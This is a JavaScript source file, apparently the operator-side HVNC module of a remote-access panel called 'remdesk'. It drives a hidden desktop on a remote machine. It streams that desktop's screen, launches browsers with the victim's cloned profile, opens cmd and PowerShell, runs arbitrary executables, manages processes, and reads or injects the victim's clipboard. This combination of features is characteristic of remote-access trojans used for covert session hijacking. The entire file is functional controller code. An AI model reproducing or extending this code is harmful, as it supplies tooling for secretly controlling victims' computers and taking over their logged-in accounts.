/**
 * HVNC (Hidden Virtual Network Computing) Control Module
 * 
 * Handles all HVNC-related functionality including:
 * - Starting/stopping hidden desktop
 * - Launching applications with profile cloning
 * - Clipboard operations
 * - Process management
 * - Screen preview display
 * - Popup window management
 */
(() => {
  "use strict";

  const remdesk = window.remdesk || (window.remdesk = {});
  const { state, dom } = remdesk;

  // HVNC State
  const hvncState = {
    active: false,
    desktopName: null,
    processes: [],
    previewInterval: null,
    previewActive: false,
    windowOpen: false,
    settings: {
      interval: 500,
      quality: 50,
      resize: 50,
    },
  };

  // Reference to the external HVNC window (declared early for hoisting)
  let hvncExternalWindow = null;

  /**
   * Send message to HVNC external window
   */
  function sendToHvncWindow(action, data = {}) {
    if (hvncExternalWindow && !hvncExternalWindow.closed) {
      hvncExternalWindow.postMessage({ type: "hvnc_parent", action, ...data }, "*");
    }
  }

  // DOM Elements for HVNC
  const hvncDom = {
    status: document.getElementById("hvncStatus"),
    startBtn: document.getElementById("hvncStartBtn"),
    stopBtn: document.getElementById("hvncStopBtn"),
    browserDialog: document.getElementById("hvncBrowserDialog"),
    runDialog: document.getElementById("hvncRunDialog"),
    clipboardDialog: document.getElementById("hvncClipboardDialog"),
    processDialog: document.getElementById("hvncProcessDialog"),
    killDialog: document.getElementById("hvncKillDialog"),
    cloneProfileCheckbox: document.getElementById("hvncCloneProfile"),
    exePath: document.getElementById("hvncExePath"),
    exeArgs: document.getElementById("hvncExeArgs"),
    clipboardText: document.getElementById("hvncClipboardText"),
    processPath: document.getElementById("hvncProcessPath"),
    processArgs: document.getElementById("hvncProcessArgs"),
    killPid: document.getElementById("hvncKillPid"),
    hvncButtons: document.querySelectorAll("[data-hvnc-action]"),
    browserButtons: document.querySelectorAll("[data-browser]"),
    // In-panel preview (legacy)
    previewImg: document.getElementById("hvncPreviewImg"),
    previewPlaceholder: document.getElementById("hvncPreviewPlaceholder"),
    previewFrame: document.getElementById("hvncPreviewFrame"),
    // Popup window elements
    window: document.getElementById("hvncWindow"),
    windowClose: document.getElementById("hvncWindowClose"),
    screenImg: document.getElementById("hvncScreenImg"),
    screenPlaceholder: document.getElementById("hvncScreenPlaceholder"),
    screenStatus: document.getElementById("hvncScreenStatus"),
    intervalSlider: document.getElementById("hvncIntervalSlider"),
    intervalValue: document.getElementById("hvncIntervalValue"),
    qualitySlider: document.getElementById("hvncQualitySlider"),
    qualityValue: document.getElementById("hvncQualityValue"),
    resizeSlider: document.getElementById("hvncResizeSlider"),
    resizeValue: document.getElementById("hvncResizeValue"),
    windowAction: document.getElementById("hvncWindowAction"),
    okBtn: document.getElementById("hvncOkBtn"),
    panelButtons: document.querySelectorAll(".hvnc-panel-btn[data-hvnc-action]"),
  };

  /**
   * Update HVNC status display
   */
  function setHvncStatus(message, state) {
    if (!hvncDom.status) return;
    hvncDom.status.textContent = message;
    hvncDom.status.setAttribute("data-state", state || "");
  }

  /**
   * Send HVNC action to client via data channel
   */
  function sendHvncAction(action, payload = {}) {
    if (!state.controlChannel || state.controlChannel.readyState !== "open") {
      setHvncStatus("HVNC: Not connected", "error");
      return false;
    }

    const message = {
      action: `hvnc_${action}`,
      ...payload
    };

    try {
      if (remdesk.sendEncrypted) {
        remdesk.sendEncrypted(message);
      } else {
        state.controlChannel.send(JSON.stringify(message));
      }
      return true;
    } catch (err) {
      console.error("Failed to send HVNC action:", err);
      setHvncStatus("HVNC: Send failed", "error");
      return false;
    }
  }

  /**
   * Start HVNC session - creates hidden desktop
   */
  function startHvnc() {
    setHvncStatus("HVNC: Starting...", "");
    if (sendHvncAction("start")) {
      if (hvncDom.startBtn) hvncDom.startBtn.disabled = true;
    }
  }

  /**
   * Stop HVNC session - closes hidden desktop
   */
  function stopHvnc() {
    setHvncStatus("HVNC: Stopping...", "");
    if (sendHvncAction("stop")) {
      hvncState.active = false;
      updateHvncButtons();
    }
  }

  /**
   * Handle HVNC response from client
   */
  function handleHvncResponse(payload) {
    const action = payload.action || "";
    const success = payload.success !== false;
    const error = payload.error || "";

    switch (action) {
      case "hvnc_start":
        if (success) {
          hvncState.active = true;
          hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
          const statusMsg = `HVNC: Active (${hvncState.desktopName})`;
          setHvncStatus(statusMsg, "active");
          sendToHvncWindow("status", { message: statusMsg, state: "active" });
          // Start preview updates when HVNC starts
          startPreview();
        } else {
          const statusMsg = `HVNC: Failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        updateHvncButtons();
        break;

      case "hvnc_stop":
        hvncState.active = false;
        hvncState.desktopName = null;
        setHvncStatus("HVNC: Stopped", "");
        sendToHvncWindow("status", { message: "HVNC: Stopped", state: "" });
        updateHvncButtons();
        // Stop preview when HVNC stops
        stopPreview();
        break;

      case "hvnc_frame":
      case "hvnc_get_frame":
        if (success && payload.frame) {
          updatePreviewImage(payload.frame);
        }
        break;

      case "hvnc_launch_browser":
      case "hvnc_launch_app":
      case "hvnc_launch_cmd":
      case "hvnc_launch_powershell":
      case "hvnc_launch_explorer":
      case "hvnc_run_exe":
      case "hvnc_start_process":
        if (success) {
          const statusMsg = `HVNC: Launched ${payload.app || payload.path || "process"}`;
          setHvncStatus(statusMsg, "active");
          sendToHvncWindow("status", { message: statusMsg, state: "active" });
          if (payload.pid) {
            hvncState.processes.push({ pid: payload.pid, name: payload.app || payload.path });
          }
        } else {
          const statusMsg = `HVNC: Launch failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        break;

      case "hvnc_get_clipboard":
        if (success && payload.text !== undefined) {
          // Copy to local clipboard
          navigator.clipboard.writeText(payload.text).then(() => {
            const statusMsg = "HVNC: Clipboard copied to local";
            setHvncStatus(statusMsg, "active");
            sendToHvncWindow("status", { message: statusMsg, state: "active" });
          }).catch(() => {
            // Fallback: show in dialog
            prompt("Clipboard content from hidden desktop:", payload.text);
            const statusMsg = "HVNC: Clipboard retrieved";
            setHvncStatus(statusMsg, "active");
            sendToHvncWindow("status", { message: statusMsg, state: "active" });
          });
          // Also send to external window for clipboard handling
          sendToHvncWindow("clipboard_received", { text: payload.text });
        } else {
          const statusMsg = `HVNC: Get clipboard failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        break;

      case "hvnc_send_clipboard":
        if (success) {
          const statusMsg = "HVNC: Clipboard sent to hidden desktop";
          setHvncStatus(statusMsg, "active");
          sendToHvncWindow("status", { message: statusMsg, state: "active" });
        } else {
          const statusMsg = `HVNC: Send clipboard failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        closeAllDialogs();
        break;

      case "hvnc_kill_process":
        if (success) {
          const statusMsg = "HVNC: Process killed";
          setHvncStatus(statusMsg, "active");
          sendToHvncWindow("status", { message: statusMsg, state: "active" });
        } else {
          const statusMsg = `HVNC: Kill failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        closeAllDialogs();
        break;

      case "hvnc_list_processes":
        if (success && payload.processes) {
          showProcessList(payload.processes);
        } else {
          const statusMsg = `HVNC: List processes failed - ${error}`;
          setHvncStatus(statusMsg, "error");
          sendToHvncWindow("status", { message: statusMsg, state: "error" });
        }
        break;

      case "hvnc_status":
        hvncState.active = payload.active || false;
        if (hvncState.active) {
          hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
          const statusMsg = `HVNC: Active (${hvncState.desktopName})`;
          setHvncStatus(statusMsg, "active");
          sendToHvncWindow("status", { message: statusMsg, state: "active" });
          // Start preview if not already active
          if (!hvncState.previewActive) {
            startPreview();
          }
        } else {
          setHvncStatus("HVNC: Not active", "");
          sendToHvncWindow("status", { message: "HVNC: Not active", state: "" });
          stopPreview();
        }
        updateHvncButtons();
        break;

      default:
        if (action.startsWith("hvnc_")) {
          console.log("Unknown HVNC response:", payload);
        }
    }
  }

  /**
   * Update HVNC buttons state
   */
  function updateHvncButtons() {
    if (hvncDom.startBtn) {
      hvncDom.startBtn.disabled = hvncState.active;
    }
    if (hvncDom.stopBtn) {
      hvncDom.stopBtn.disabled = !hvncState.active;
    }
  }

  /**
   * Update HVNC preview image (both in-panel and external popup window)
   */
  function updatePreviewImage(imageData) {
    const src = imageData 
      ? (imageData.startsWith("data:") ? imageData : `data:image/jpeg;base64,${imageData}`)
      : null;
    
    // Update in-panel preview
    if (hvncDom.previewImg) {
      if (src) {
        hvncDom.previewImg.src = src;
        hvncDom.previewImg.classList.add("active");
        if (hvncDom.previewPlaceholder) {
          hvncDom.previewPlaceholder.classList.add("hidden");
        }
      } else {
        hvncDom.previewImg.classList.remove("active");
        if (hvncDom.previewPlaceholder) {
          hvncDom.previewPlaceholder.classList.remove("hidden");
        }
      }
    }
    
    // Update internal popup window screen (if exists - for backward compatibility)
    if (hvncDom.screenImg) {
      if (src) {
        hvncDom.screenImg.src = src;
        hvncDom.screenImg.classList.add("active");
        if (hvncDom.screenPlaceholder) {
          hvncDom.screenPlaceholder.classList.add("hidden");
        }
      } else {
        hvncDom.screenImg.classList.remove("active");
        if (hvncDom.screenPlaceholder) {
          hvncDom.screenPlaceholder.classList.remove("hidden");
        }
      }
    }

    // Update integrated popup window (hvncPopup)
    if (remdesk.hvncPopup) {
      if (imageData) {
        // Pass raw base64 data without data: prefix - popup will add it
        const rawData = imageData.startsWith("data:") 
          ? imageData.replace(/^data:image\/\w+;base64,/, "")
          : imageData;
        remdesk.hvncPopup.updateFrame(rawData);
      } else {
        remdesk.hvncPopup.showPlaceholder();
      }
    }

    // Send frame to external HVNC window (browser popup mode)
    if (hvncExternalWindow && !hvncExternalWindow.closed && imageData) {
      const rawData = imageData.startsWith("data:") 
        ? imageData.replace(/^data:image\/\w+;base64,/, "")
        : imageData;
      sendToHvncWindow("frame", { frame: rawData });
    }
  }

  /**
   * Start preview updates
   */
  function startPreview() {
    if (hvncState.previewActive) return;
    
    hvncState.previewActive = true;
    
    // Request frame immediately
    requestPreviewFrame();
    
    // Set up periodic frame requests based on interval setting
    hvncState.previewInterval = setInterval(() => {
      if (hvncState.active && hvncState.previewActive) {
        requestPreviewFrame();
      }
    }, hvncState.settings.interval);
  }

  /**
   * Stop preview updates
   */
  function stopPreview() {
    hvncState.previewActive = false;
    
    if (hvncState.previewInterval) {
      clearInterval(hvncState.previewInterval);
      hvncState.previewInterval = null;
    }
    
    // Clear preview image
    updatePreviewImage(null);
  }

  /**
   * Request a preview frame from the client
   */
  function requestPreviewFrame() {
    if (!hvncState.active) return;
    sendHvncAction("get_frame", { 
      quality: hvncState.settings.quality, 
      scale: hvncState.settings.resize / 100 
    });
  }

  /**
   * Update preview interval
   */
  function updatePreviewInterval(interval) {
    hvncState.settings.interval = interval;
    
    // Restart preview if active
    if (hvncState.previewActive) {
      if (hvncState.previewInterval) {
        clearInterval(hvncState.previewInterval);
      }
      hvncState.previewInterval = setInterval(() => {
        if (hvncState.active && hvncState.previewActive) {
          requestPreviewFrame();
        }
      }, interval);
    }
  }

  /**
   * Check if running in PyQt6 WebEngine (desktop app) or browser
   */
  function isDesktopApp() {
    return typeof qt !== 'undefined' || 
           (typeof window.remdeskHost !== 'undefined') ||
           (typeof QWebChannel !== 'undefined');
  }

  /**
   * Get session ID from state or URL
   */
  function getSessionId() {
    if (state && state.sessionId) return state.sessionId;
    const params = new URLSearchParams(window.location.search);
    return params.get('session_id') || 'unknown';
  }

  /**
   * Show HVNC window - opens hvnc_window.html in a separate browser window
   * This provides full mouse/keyboard input support for the hidden desktop
   */
  function showHvncWindow() {
    // Check if external window already exists and is open
    if (hvncExternalWindow && !hvncExternalWindow.closed) {
      hvncExternalWindow.focus();
      return;
    }

    // Always use window.open to create a separate native window
    // This ensures proper input handling and avoids popup constraints
    const width = 1024;
    const height = 768;
    const left = Math.max(0, (screen.width - width) / 2);
    const top = Math.max(0, (screen.height - height) / 2);

    hvncExternalWindow = window.open(
      "hvnc_window.html",
      "HVNCWindow",
      `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=no`
    );

    if (hvncExternalWindow) {
      hvncState.windowOpen = true;
      console.log("HVNC window opened successfully");
      
      // Start HVNC if not already active
      if (!hvncState.active) {
        startHvnc();
      } else {
        startPreview();
      }
    } else {
      console.error("Failed to open HVNC window - popup may be blocked");
      setHvncStatus("HVNC: Window blocked - allow popups", "error");
      alert("Failed to open HVNC window. Please allow popups for this site.");
    }
  }

  /**
   * Hide/close HVNC window
   */
  function hideHvncWindow() {
    // Close external window if open
    if (hvncExternalWindow && !hvncExternalWindow.closed) {
      hvncExternalWindow.close();
    }
    hvncExternalWindow = null;
    hvncState.windowOpen = false;
  }

  /**
   * Called by PyQt when HVNC window is opened
   */
  function _onWindowOpened(windowType, sessionId) {
    console.log(`HVNC window opened: ${windowType} for session ${sessionId}`);
    hvncState.windowOpen = true;
    
    // Start HVNC if not active
    if (!hvncState.active) {
      startHvnc();
    } else {
      startPreview();
    }
  }

  /**
   * Called by PyQt when HVNC window is closed
   */
  function _onWindowClosed(windowType) {
    console.log(`HVNC window closed: ${windowType}`);
    hvncState.windowOpen = false;
  }

  /**
   * Handle messages from HVNC external window (browser mode)
   */
  function handleHvncWindowMessage(event) {
    const data = event.data;
    if (!data || data.type !== "hvnc_window") return;

    switch (data.action) {
      case "ready":
        sendToHvncWindow("settings", { settings: hvncState.settings });
        if (hvncState.active) {
          sendToHvncWindow("status", { 
            message: `HVNC: Active (${hvncState.desktopName})`, 
            state: "active" 
          });
        }
        break;

      case "action":
        if (data.hvncAction) {
          const payload = { ...data };
          delete payload.type;
          delete payload.action;
          delete payload.hvncAction;
          sendHvncAction(data.hvncAction, payload);
        }
        break;

      case "settings_changed":
        if (data.setting && data.value !== undefined) {
          hvncState.settings[data.setting] = data.value;
          if (data.setting === "interval") {
            updatePreviewInterval(data.value);
          }
        }
        break;

      case "hvnc_control":
        // Forward mouse/keyboard input to HVNC hidden desktop
        if (hvncState.active && state.controlChannel && state.controlChannel.readyState === "open") {
          const controlPayload = {
            action: "hvnc_control",
            hvnc: true,
            ...data
          };
          delete controlPayload.type;
          delete controlPayload.action;
          
          try {
            if (remdesk.sendEncrypted) {
              remdesk.sendEncrypted(controlPayload);
            } else {
              state.controlChannel.send(JSON.stringify(controlPayload));
            }
          } catch (err) {
            console.error("Failed to send HVNC control:", err);
          }
        }
        break;

      case "closed":
        hvncExternalWindow = null;
        hvncState.windowOpen = false;
        break;
    }
  }

  // Listen for messages from HVNC window (browser mode)
  window.addEventListener("message", handleHvncWindowMessage);

  /**
   * Update screen status text
   */
  function updateScreenStatus(text) {
    if (hvncDom.screenStatus) {
      hvncDom.screenStatus.textContent = text || "";
    }
  }

  /**
   * Show dialog
   */
  function showDialog(dialog) {
    if (dialog) {
      dialog.style.display = "flex";
    }
  }

  /**
   * Close dialog
   */
  function closeDialog(dialog) {
    if (dialog) {
      dialog.style.display = "none";
    }
  }

  /**
   * Close all dialogs
   */
  function closeAllDialogs() {
    [hvncDom.browserDialog, hvncDom.runDialog, hvncDom.clipboardDialog, 
     hvncDom.processDialog, hvncDom.killDialog].forEach(d => closeDialog(d));
  }

  /**
   * Handle HVNC action button click
   */
  function handleHvncAction(action) {
    if (!hvncState.active && action !== "start") {
      setHvncStatus("HVNC: Please start HVNC first", "error");
      return;
    }

    switch (action) {
      case "browsers":
        showDialog(hvncDom.browserDialog);
        break;

      case "cmd":
        sendHvncAction("launch_cmd");
        break;

      case "powershell":
        sendHvncAction("launch_powershell");
        break;

      case "explorer":
        sendHvncAction("launch_explorer");
        break;

      case "run":
        showDialog(hvncDom.runDialog);
        break;

      case "get_clipboard":
        sendHvncAction("get_clipboard");
        break;

      case "send_clipboard":
        showDialog(hvncDom.clipboardDialog);
        break;

      case "start_process":
        showDialog(hvncDom.processDialog);
        break;

      case "kill_process":
        showDialog(hvncDom.killDialog);
        break;

      case "list_processes":
        sendHvncAction("list_processes");
        break;
    }
  }

  /**
   * Launch browser with optional profile cloning
   */
  function launchBrowser(browser) {
    const cloneProfile = hvncDom.cloneProfileCheckbox ? hvncDom.cloneProfileCheckbox.checked : true;
    sendHvncAction("launch_browser", {
      browser: browser,
      clone_profile: cloneProfile
    });
    closeDialog(hvncDom.browserDialog);
  }

  /**
   * Run custom executable
   */
  function runExe() {
    const path = hvncDom.exePath ? hvncDom.exePath.value.trim() : "";
    const args = hvncDom.exeArgs ? hvncDom.exeArgs.value.trim() : "";
    
    if (!path) {
      alert("Please enter executable path");
      return;
    }

    sendHvncAction("run_exe", { path, args });
    closeDialog(hvncDom.runDialog);
    
    // Clear inputs
    if (hvncDom.exePath) hvncDom.exePath.value = "";
    if (hvncDom.exeArgs) hvncDom.exeArgs.value = "";
  }

  /**
   * Send clipboard to hidden desktop
   */
  function sendClipboard() {
    const text = hvncDom.clipboardText ? hvncDom.clipboardText.value : "";
    
    if (!text) {
      alert("Please enter text to send");
      return;
    }

    sendHvncAction("send_clipboard", { text });
    closeDialog(hvncDom.clipboardDialog);
    
    if (hvncDom.clipboardText) hvncDom.clipboardText.value = "";
  }

  /**
   * Start process on hidden desktop
   */
  function startProcess() {
    const path = hvncDom.processPath ? hvncDom.processPath.value.trim() : "";
    const args = hvncDom.processArgs ? hvncDom.processArgs.value.trim() : "";
    
    if (!path) {
      alert("Please enter command or path");
      return;
    }

    sendHvncAction("start_process", { path, args });
    closeDialog(hvncDom.processDialog);
    
    if (hvncDom.processPath) hvncDom.processPath.value = "";
    if (hvncDom.processArgs) hvncDom.processArgs.value = "";
  }

  /**
   * Kill process on hidden desktop
   */
  function killProcess() {
    const target = hvncDom.killPid ? hvncDom.killPid.value.trim() : "";
    
    if (!target) {
      alert("Please enter PID or process name");
      return;
    }

    // Check if it's a number (PID) or string (name)
    const pid = parseInt(target, 10);
    if (!isNaN(pid)) {
      sendHvncAction("kill_process", { pid });
    } else {
      sendHvncAction("kill_process", { name: target });
    }
    
    closeDialog(hvncDom.killDialog);
    if (hvncDom.killPid) hvncDom.killPid.value = "";
  }

  /**
   * Show process list
   */
  function showProcessList(processes) {
    const list = processes.map(p => `PID: ${p.pid} - ${p.name}`).join("\n");
    alert("Running processes on hidden desktop:\n\n" + (list || "No processes"));
  }

  /**
   * Initialize HVNC module
   */
  function initHvnc() {
    // Start/Stop buttons
    if (hvncDom.startBtn) {
      hvncDom.startBtn.addEventListener("click", startHvnc);
    }
    if (hvncDom.stopBtn) {
      hvncDom.stopBtn.addEventListener("click", stopHvnc);
    }

    // Action buttons (in-panel and popup)
    hvncDom.hvncButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        const action = btn.dataset.hvncAction;
        if (action) handleHvncAction(action);
      });
    });

    // Popup window panel buttons
    hvncDom.panelButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        const action = btn.dataset.hvncAction;
        if (action) handleHvncAction(action);
      });
    });

    // Browser buttons in dialog
    hvncDom.browserButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        const browser = btn.dataset.browser;
        if (browser) launchBrowser(browser);
      });
    });

    // Dialog close buttons
    document.querySelectorAll(".hvnc-dialog-close").forEach(btn => {
      btn.addEventListener("click", () => {
        const dialog = btn.closest(".hvnc-dialog");
        closeDialog(dialog);
      });
    });

    // Dialog backdrop click to close
    document.querySelectorAll(".hvnc-dialog").forEach(dialog => {
      dialog.addEventListener("click", (e) => {
        if (e.target === dialog) {
          closeDialog(dialog);
        }
      });
    });

    // Run EXE button
    const runExeBtn = document.getElementById("hvncRunExeBtn");
    if (runExeBtn) {
      runExeBtn.addEventListener("click", runExe);
    }

    // Send clipboard button
    const sendClipboardBtn = document.getElementById("hvncSendClipboardBtn");
    if (sendClipboardBtn) {
      sendClipboardBtn.addEventListener("click", sendClipboard);
    }

    // Start process button
    const startProcessBtn = document.getElementById("hvncStartProcessBtn");
    if (startProcessBtn) {
      startProcessBtn.addEventListener("click", startProcess);
    }

    // Kill process button
    const killProcessBtn = document.getElementById("hvncKillProcessBtn");
    if (killProcessBtn) {
      killProcessBtn.addEventListener("click", killProcess);
    }

    // === HVNC Popup Window Events ===
    
    // Close window button
    if (hvncDom.windowClose) {
      hvncDom.windowClose.addEventListener("click", hideHvncWindow);
    }

    // OK button
    if (hvncDom.okBtn) {
      hvncDom.okBtn.addEventListener("click", () => {
        // Apply window action if selected
        const action = hvncDom.windowAction ? hvncDom.windowAction.value : "close";
        if (action === "close") {
          hideHvncWindow();
        }
        // minimize and maximize actions would need backend support
      });
    }

    // Interval slider
    if (hvncDom.intervalSlider) {
      hvncDom.intervalSlider.addEventListener("input", (e) => {
        const value = parseInt(e.target.value, 10);
        hvncState.settings.interval = value;
        if (hvncDom.intervalValue) {
          hvncDom.intervalValue.textContent = value;
        }
        updatePreviewInterval(value);
      });
    }

    // Quality slider
    if (hvncDom.qualitySlider) {
      hvncDom.qualitySlider.addEventListener("input", (e) => {
        const value = parseInt(e.target.value, 10);
        hvncState.settings.quality = value;
        if (hvncDom.qualityValue) {
          hvncDom.qualityValue.textContent = value;
        }
      });
    }

    // Resize slider
    if (hvncDom.resizeSlider) {
      hvncDom.resizeSlider.addEventListener("input", (e) => {
        const value = parseInt(e.target.value, 10);
        hvncState.settings.resize = value;
        if (hvncDom.resizeValue) {
          hvncDom.resizeValue.textContent = value;
        }
      });
    }

    // Make window draggable
    if (hvncDom.window) {
      makeDraggable(hvncDom.window);
    }

    // Request HVNC status when connected
    if (state.isConnected) {
      sendHvncAction("status");
    }

    console.log("HVNC module initialized");
  }

  /**
   * Make an element draggable by its header
   */
  function makeDraggable(element) {
    const header = element.querySelector(".hvnc-window-header");
    if (!header) return;

    let isDragging = false;
    let offsetX = 0;
    let offsetY = 0;

    header.addEventListener("mousedown", (e) => {
      if (e.target.closest(".hvnc-window-close")) return;
      isDragging = true;
      offsetX = e.clientX - element.offsetLeft;
      offsetY = e.clientY - element.offsetTop;
      element.style.transform = "none";
    });

    document.addEventListener("mousemove", (e) => {
      if (!isDragging) return;
      element.style.left = (e.clientX - offsetX) + "px";
      element.style.top = (e.clientY - offsetY) + "px";
    });

    document.addEventListener("mouseup", () => {
      isDragging = false;
    });
  }

  // Export functions
  remdesk.hvnc = {
    state: hvncState,
    start: startHvnc,
    stop: stopHvnc,
    handleResponse: handleHvncResponse,
    sendAction: sendHvncAction,
    init: initHvnc,
    startPreview: startPreview,
    stopPreview: stopPreview,
    updatePreviewImage: updatePreviewImage,
    showWindow: showHvncWindow,
    hideWindow: hideHvncWindow,
    // Internal callbacks for PyQt integration
    _onWindowOpened: _onWindowOpened,
    _onWindowClosed: _onWindowClosed,
    isDesktopApp: isDesktopApp,
  };

  // Auto-init when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initHvnc);
  } else {
    initHvnc();
  }
})();
